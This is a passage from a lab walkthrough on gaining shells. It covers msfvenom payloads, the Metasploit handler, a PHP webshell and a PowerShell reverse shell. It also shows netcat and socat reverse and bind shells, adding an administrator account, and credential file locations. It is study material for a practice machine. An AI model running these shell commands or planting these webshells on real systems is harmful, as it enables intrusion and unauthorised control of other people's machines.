<code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code>. <code>linux/x86/shell_reverse_tcp</code> constitute to <code>linux 32-bit</code> OS, <code>windows/shell_reverse_tcp</code> constitute to <code>windows 32-bit</code> OS and <code>windows/x64/shell_reverse_tcp</code> constitute to <code>windows 64-bit</code> OS.</p><p><code>shell_reverse_tcp</code> is a stageless payload where there is <code>_</code> after <code>shell</code> keyword, and <code>shell/reverse_tcp</code> is a staged payload where there is <code>/</code> after <code>shell</code> keyword.</p><p>The following example is used to generate linux elf binary with staged reverse shell payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20linux/x64/meterpreter/reverse_tcp%20-f%20elf%20-o%20shell%20LHOST=10.10.10.5%20LPORT=443" type="button"></button></div></div><pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
</code></pre><p>To list available payloads, use the below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20--list%20payloads" type="button"></button></div></div><pre><code>msfvenom --list payloads
</code></pre><h2 id="task-10---metasploit-multihandler">Task 10 - Metasploit multi/handler</h2><p>Multi/Handler is a tool for catching reverse shells.</p><p>Use <code>msfconsole</code> to configure and spawn a <code>reverse shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msf6%20%3E%20use%20multi/handler%0A[*]%20Using%20configured%20payload%20generic/shell_reverse_tcp%0A%0Amsf6%20exploit(multi/handler)%20%3E%20options%0A%0AModule%20options%20(exploit/multi/handler):%0A%0AName%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20---------------%20%20--------%20%20-----------%0A%0A%0APayload%20options%20(generic/shell_reverse_tcp):%0A%0AName%20%20%20Current%20Setting%20%20Required%20%20Description%0A----%20%20%20---------------%20%20--------%20%20-----------%0ALHOST%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20address%20(an%20interface%20may%20be%20specified)%0ALPORT%20%204444%20%20%20%20%20%20%20%20%20%20%20%20%20yes%20%20%20%20%20%20%20The%20listen%20port%0A%0A%0AExploit%20target:%0A%0AId%20%20Name%0A--%20%20----%0A0%20%20%20Wildcard%20Target%0A%0A%0Amsf6%20exploit(multi/handler)%20%3E%20set%20LHOST%20%3Cip%3E%0ALHOST%20=%3E%20%3Cip%3E%0Amsf6%20exploit(multi/handler)%20%3E%20set%20LPORT%20443%0ALPORT%20=%3E%20443%0Amsf6%20exploit(multi/handler)%20%3E%20set%20PAYLOAD%20windows/x64/shell/reverse_tcp%0APAYLOAD%20=%3E%20windows/x64/shell/reverse_tcp%0A%0Amsf6%20exploit(multi/handler)%20%3E%20exploit%20-j%0A[*]%20Exploit%20running%20as%20background%20job%200.%0A[*]%20Exploit%20completed,%20but%20no%20session%20was%20created.%0A%0A[*]%20Started%20reverse%20TCP%20handler%20on%20%3Cip%3E:443" type="button"></button></div></div><pre><code>msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) &gt; options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Wildcard Target


msf6 exploit(multi/handler) &gt; set LHOST &lt;ip&gt;
LHOST =&gt; &lt;ip&gt;
msf6 exploit(multi/handler) &gt; set LPORT 443
LPORT =&gt; 443
msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD =&gt; windows/x64/shell/reverse_tcp

msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on &lt;ip&gt;:443
</code></pre><p>Once listener receives the connection, a session will be opened. Use <code>sessions</code> can be used to list sessions. Use <code>sessions &lt;id&gt;</code> to bring the session to foreground.</p><h2 id="task-11---webshells">Task 11 - WebShells</h2><h3 id="references-4">References</h3><ul><li><a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target="_blank">PHP reverse shell</a></ul><p>Webshell is a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage either through a HTML form, or directly as arguments in the URL, which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell. Variety of web shells are available in /usr/share/webshells in kali linux.</p><p>An example for php webshell is as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%3C?php%20echo%20%22%3Cpre%3E%22%20.%20shell_exec($_GET[%22cmd%22])%20.%20%22%3C/pre%3E%22;%20?%3E" type="button"></button></div></div><pre><code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET["cmd"]) . "&lt;/pre&gt;"; ?&gt;
</code></pre><p>An example for powershell webshell is as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="powershell%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('%3CIP%3E',%3CPORT%3E);$stream%20=%20$client.GetStream();[byte[]]$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&amp;1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22" type="button"></button></div></div><pre><code>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
</code></pre><h2 id="task-12---next-steps">Task 12 - Next Steps</h2><h3 id="references-5">References</h3><ul><li><a href="https://dirtycow.ninja/" target="_blank">Dirty COW (CVE-2016-5195) Privilege Escalation</a></ul><p>On linux ideally there would be opportunities to gain access to a user account. SSH keys stored at <code>/home/&lt;user&gt;/.ssh</code> are often an ideal way to do this.</p><p>On Windows the options are often more limited. Itâ€™s sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code> or <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code>. We would obtain a shell running as the <code>SYSTEM</code> user, or an <code>administrator</code> account running with high privileges. In such a situation itâ€™s possible to simply add own account (in the administrators group) to the machine, then log in over <code>RDP</code>, <code>telnet</code>, <code>winexe</code>, <code>psexec</code>, <code>WinRM</code> or any number of other methods, dependent on the services running on the box.</p><p>Once shell is obtained, the following sample commands can be used to add user with privileges.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="net%20user%20%3Cusername%3E%20%3Cpassword%3E%20/add%0Anet%20localgroup%20administrators%20%3Cusername%3E%20/add" type="button"></button></div></div><pre><code>net user &lt;username&gt; &lt;password&gt; /add
net localgroup administrators &lt;username&gt; /add
</code></pre><h2 id="task-13---practice-and-examples">Task 13 - Practice and Examples</h2><h3 id="enumeration---linux">Enumeration - Linux</h3><p>Check the services running in the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20-F%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS -F &lt;ip&gt;
</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-04-13%2004:44%20BST%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up%20(0.0010s%20latency).%0ANot%20shown:%2098%20closed%20ports%0APORT%20%20%20STATE%20SERVICE%0A22/tcp%20open%20%20ssh%0A80/tcp%20open%20%20http%0AMAC%20Address:%2002:34:D3:9D:EB:4B%20(Unknown)%0A%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%201.57%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-13 04:44 BST
Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
Host is up (0.0010s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:34:D3:9D:EB:4B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
</code></pre><h3 id="web-shell-upload---linux">Web shell upload - Linux</h3><p>Copy the webshell available in <code>/usr/share/webshells/php/php-reverse-shell.php</code> and edit the file to modify <code>ip</code> and <code>port</code> of attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="$ip%20=%20'%3Clocal-ip%3E';%0A$port%20=%20443;" type="button"></button></div></div><pre><code>$ip = '&lt;local-ip&gt;';
$port = 443;
</code></pre><p>Use <code>stty -a</code> to get the current terminal settings.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="speed%2038400%20baud;%20rows%2034;%20columns%20169;%20line%20=%200;%0Aintr%20=%20%5EC;%20quit%20=%20%5E%5C;%20erase%20=%20%5E?;%20kill%20=%20%5EU;%20eof%20=%20%5ED;%20eol%20=%20%3Cundef%3E;%20eol2%20=%20%3Cundef%3E;%20swtch%20=%20%3Cundef%3E;%20start%20=%20%5EQ;%20stop%20=%20%5ES;%20susp%20=%20%5EZ;%20rprnt%20=%20%5ER;%20werase%20=%20%5EW;%0Alnext%20=%20%5EV;%20discard%20=%20%5EO;%20min%20=%201;%20time%20=%200;%0A-parenb%20-parodd%20-cmspar%20cs8%20-hupcl%20-cstopb%20cread%20-clocal%20-crtscts%0A-ignbrk%20brkint%20ignpar%20-parmrk%20-inpck%20-istrip%20-inlcr%20-igncr%20icrnl%20ixon%20-ixoff%20-iuclc%20-ixany%20imaxbel%20-iutf8%0Aopost%20-olcuc%20-ocrnl%20onlcr%20-onocr%20-onlret%20-ofill%20-ofdel%20nl0%20cr0%20tab0%20bs0%20vt0%20ff0%0Aisig%20icanon%20iexten%20echo%20echoe%20echok%20-echonl%20-noflsh%20-xcase%20-tostop%20-echoprt%20echoctl%20echoke%20-flusho%20-extproc" type="button"></button></div></div><pre><code>speed 38400 baud; rows 34; columns 169; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
</code></pre><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%20443" type="button"></button></div></div><pre><code>nc -lnvp 443
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Use <code>firefox</code> to login to the url <code>http://&lt;ip&gt;</code>, browse the <code>php-reverse-shell.php</code> payload and submit. Access the url <code>http://&lt;ip&gt;/uploads/php-reverse-shell.php</code> to activate the <code>reverse shell</code>.</p><p>The <code>reverse shell</code> would have spawned at the netcat listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2059564%20received!%0ALinux%20linux-shell-practice%204.15.0-117-generic%20#118-Ubuntu%20SMP%20Fri%20Sep%204%2020:02:41%20UTC%202020%20x86_64%20x86_64%20x86_64%20GNU/Linux%0A%2005:00:56%20up%2050%20min,%20%201%20user,%20%20load%20average:%200.00,%200.00,%200.00%0AUSER%20%20%20%20%20TTY%20%20%20%20%20%20FROM%20%20%20%20%20%20%20%20%20%20%20%20%20LOGIN@%20%20%20IDLE%20%20%20JCPU%20%20%20PCPU%20WHAT%0Ashell%20%20%20%20pts/0%20%20%20%20%3Cip%3E%20%20%20%2004:25%20%20%2020:16%20%20%200.07s%20%200.02s%20python3%20-c%20import%20pty%20;%20pty.spawn(%22/bin/bash%22)%0Auid=33(www-data)%20gid=33(www-data)%20groups=33(www-data)%0A/bin/sh:%200:%20can't%20access%20tty;%20job%20control%20turned%20off" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 59564 received!
Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:00:56 up 50 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shell    pts/0    &lt;ip&gt;    04:25   20:16   0.07s  0.02s python3 -c import pty ; pty.spawn("/bin/bash")
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
</code></pre><p>Use <code>python</code> to spawn <code>bash</code> shell. Background the <code>netcat</code> listener in attacking machine to sanitise the <code>reverse shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="$%20python3%20-c%20'import%20pty%20;%20pty.spawn(%22/bin/bash%22)'%0Awww-data@linux-shell-practice:/$%20%5EZ%0A[1]+%20%20Stopped%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>$ python3 -c 'import pty ; pty.spawn("/bin/bash")'
www-data@linux-shell-practice:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
</code></pre><p>Turn off <code>echo</code> in shell and foreground it so the <code>reverse shell</code> in attacking machine can show the output properly inside <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20raw%20-echo%20;%20fg" type="button"></button></div></div><pre><code>stty raw -echo ; fg
</code></pre><p>An output similar to below will be obtained. TTY rows and columns can also be set so <code>vim</code> or <code>nano</code> editor will be aligned according to shell resolution.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%20443%0A%0Awww-data@linux-shell-practice:/$%20%5EC%0Awww-data@linux-shell-practice:/$%20stty%20rows%2034%0Awww-data@linux-shell-practice:/$%20stty%20cols%20169%0Awww-data@linux-shell-practice:/$%20exit" type="button"></button></div></div><pre><code>nc -lnvp 443

www-data@linux-shell-practice:/$ ^C
www-data@linux-shell-practice:/$ stty rows 34
www-data@linux-shell-practice:/$ stty cols 169
www-data@linux-shell-practice:/$ exit
</code></pre><h3 id="reverse-netcat-shell---linux">Reverse Netcat Shell - Linux</h3><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%20443" type="button"></button></div></div><pre><code>nc -lnvp 443
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Listening%20on%20[0.0.0.0]%20(family%200,%20port%20443)" type="button"></button></div></div><pre><code>Listening on [0.0.0.0] (family 0, port 443)
</code></pre><p>Activate the <code>reverse shell</code> from the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mkfifo%20/tmp/f%20;%20nc%20%3Clocal-ip%3E%20443%20%3C/tmp/f%20%7C%20/bin/sh%20%3E%20/tmp/f%202%3E&amp;1%20;%20rm%20-f%20/tmp/f" type="button"></button></div></div><pre><code>mkfifo /tmp/f ; nc &lt;local-ip&gt; 443 &lt;/tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1 ; rm -f /tmp/f
</code></pre><p>The <code>reverse shell</code> in attacking machine would have spawned at the <code>netcat</code> listener. Use <code>python</code> to spawn <code>bash</code> shell. Background the <code>netcat</code> listener to sanitise the <code>reverse shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Ctarget-ip%3E%2059568%20received!%0A%0Apython3%20-c%20'import%20pty%20;%20pty.spawn(%22/bin/bash%22)'%0Ashell@linux-shell-practice:~$%20%5EZ%0A[1]+%20%20Stopped%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nc%20-lnvp%20443" type="button"></button></div></div><pre><code>Connection from &lt;target-ip&gt; 59568 received!

python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
</code></pre><p>Turn off <code>echo</code> in <code>reverse shell</code> in attacking machine and foreground it so the <code>reverse shell</code> can show the output properly inside <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20raw%20-echo%20;%20fg" type="button"></button></div></div><pre><code>stty raw -echo ; fg
</code></pre><p>An output similar to below will be obtained. TTY rows and columns can also be set so <code>vim</code> or <code>nano</code> editor will be aligned according to shell resolution.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%20443%0A%0Ashell@linux-shell-practice:~$%20export%20TERM=xterm%0Ashell@linux-shell-practice:~$%20%5EC%0Ashell@linux-shell-practice:~$%20" type="button"></button></div></div><pre><code>nc -lnvp 443

shell@linux-shell-practice:~$ export TERM=xterm
shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ 
</code></pre><h3 id="bind-netcat-shell---linux">Bind Netcat Shell - Linux</h3><p>Create a <code>netcat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lvnp%204444%20-e%20/bin/bash" type="button"></button></div></div><pre><code>nc -lvnp 4444 -e /bin/bash
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="listening%20on%20[any]%204444%20..." type="button"></button></div></div><pre><code>listening on [any] 4444 ...
</code></pre><p>Use <code>stty -a</code> to get the current terminal settings.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="speed%2038400%20baud;%20rows%2034;%20columns%20169;%20line%20=%200;%0Aintr%20=%20%5EC;%20quit%20=%20%5E%5C;%20erase%20=%20%5E?;%20kill%20=%20%5EU;%20eof%20=%20%5ED;%20eol%20=%20%3Cundef%3E;%20eol2%20=%20%3Cundef%3E;%20swtch%20=%20%3Cundef%3E;%20start%20=%20%5EQ;%20stop%20=%20%5ES;%20susp%20=%20%5EZ;%20rprnt%20=%20%5ER;%20werase%20=%20%5EW;%0Alnext%20=%20%5EV;%20discard%20=%20%5EO;%20min%20=%201;%20time%20=%200;%0A-parenb%20-parodd%20-cmspar%20cs8%20-hupcl%20-cstopb%20cread%20-clocal%20-crtscts%0A-ignbrk%20brkint%20ignpar%20-parmrk%20-inpck%20-istrip%20-inlcr%20-igncr%20icrnl%20ixon%20-ixoff%20-iuclc%20-ixany%20imaxbel%20-iutf8%0Aopost%20-olcuc%20-ocrnl%20onlcr%20-onocr%20-onlret%20-ofill%20-ofdel%20nl0%20cr0%20tab0%20bs0%20vt0%20ff0%0Aisig%20icanon%20iexten%20echo%20echoe%20echok%20-echonl%20-noflsh%20-xcase%20-tostop%20-echoprt%20echoctl%20echoke%20-flusho%20-extproc" type="button"></button></div></div><pre><code>speed 38400 baud; rows 34; columns 169; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk brkint ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
</code></pre><p>Create a <code>netcat</code> listener in target machine for <code>bind shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-nv%20%3Ctarget-ip%3E%204444" type="button"></button></div></div><pre><code>nc -nv &lt;target-ip&gt; 4444
</code></pre><p>An output similar to below will be obtained, which mentions the listener is active.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20to%20%3Ctarget-ip%3E%204444%20port%20[tcp/*]%20succeeded!" type="button"></button></div></div><pre><code>Connection to &lt;target-ip&gt; 4444 port [tcp/*] succeeded!
</code></pre><p>Activate the <code>bind shell</code> from the attacker.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lvnp%204444%20-e%20/bin/bash" type="button"></button></div></div><pre><code>nc -lvnp 4444 -e /bin/bash
</code></pre><p>The <code>bind shell</code> in target machine would have spawned at the <code>netcat</code> initiator.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="connect%20to%20[%3Ctarget-ip%3E]%20from%20(UNKNOWN)%20[%3Clocal-ip%3E]%2053588" type="button"></button></div></div><pre><code>connect to [&lt;target-ip&gt;] from (UNKNOWN) [&lt;local-ip&gt;] 53588
</code></pre><p>Use <code>python</code> to spawn <code>bash</code> shell. Background the <code>netcat</code> activator to sanitise the <code>bind shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="python3%20-c%20'import%20pty%20;%20pty.spawn(%22/bin/bash%22)'%0Ashell@linux-shell-practice:~$%20%5EZ%0A[1]+%20%20Stopped%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nc%20-nv%20%3Ctarget-ip%3E%204444" type="button"></button></div></div><pre><code>python3 -c 'import pty ; pty.spawn("/bin/bash")'
shell@linux-shell-practice:~$ ^Z
[1]+  Stopped                 nc -nv &lt;target-ip&gt; 4444
</code></pre><p>Turn off <code>echo</code> in <code>reverse shell</code> in attacking machine and foreground it so the <code>reverse shell</code> can show the output properly inside <code>netcat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="stty%20raw%20-echo%20;%20fg" type="button"></button></div></div><pre><code>stty raw -echo ; fg
</code></pre><p>An output similar to below will be obtained. TTY rows and columns can also be set so <code>vim</code> or <code>nano</code> editor will be aligned according to shell resolution.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-nv%20%3Ctarget-ip%3E%204444%0A%20%20%20%20shell@linux-shell-practice:~$%20%5EC%0A%20%20%20%20shell@linux-shell-practice:~$%20stty%20rows%2034%0A%20%20%20%20shell@linux-shell-practice:~$%20stty%20cols%20169%0A%20%20%20%20shell@linux-shell-practice:~$" type="button"></button></div></div><pre><code>nc -nv &lt;target-ip&gt; 4444
    shell@linux-shell-practice:~$ ^C
    shell@linux-shell-practice:~$ stty rows 34
    shell@linux-shell-practice:~$ stty cols 169
    shell@linux-shell-practice:~$
</code></pre><h3 id="reverse-socat-shell---linux">Reverse Socat Shell - Linux</h3><p><code>Socat</code> can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">here</a> and windows is <a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">here</a>.</p><p><code>Socat</code> shell is stabilised and sanitised by default and does not need additional configurations after gaining <code>shell</code>.</p><p>Create a <code>socat</code> listener in attacking machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP-L:443%20FILE:%60tty%60,raw,echo=0" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:443 FILE:`tty`,raw,echo=0
</code></pre><p>Activate the <code>reverse shell</code> from the target.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP:%3Clocal-ip%3E:443%20EXEC:%22bash%20-li%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:&lt;local-ip&gt;:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
</code></pre><p>An output similar to below will be obtained in <code>socat</code> listener.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="shell@linux-shell-practice:~$%20%5EC%0Ashell@linux-shell-practice:~$%20exit%0Alogout" type="button"></button></div></div><pre><code>shell@linux-shell-practice:~$ ^C
shell@linux-shell-practice:~$ exit
logout
</code></pre><h3 id="bind-socat-shell---linux">Bind Socat Shell - Linux</h3><p><code>Socat</code> can be installed from distribution repo or a standalone binary can be downloaded and used. The links for standalone binaries for linux is <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">here</a> and windows is <a href="https://sourceforge.net/projects/unix-utils/files/socat/" target="_blank">here</a>.</p><p><code>Socat</code> shell is stabilised and sanitised by default and does not need additional configurations after gaining <code>shell</code>.</p><p>Create a <code>socat</code> listener in target machine.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="wget%20-q%20https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat%20-O%20/tmp/socat;%20chmod%20+x%20/tmp/socat;%20/tmp/socat%20TCP-L:4430%20EXEC:%22bash%20-li%22,pty,stderr,sigint,setsid,sane" type="button"></button></div></div><pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-L:4430 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
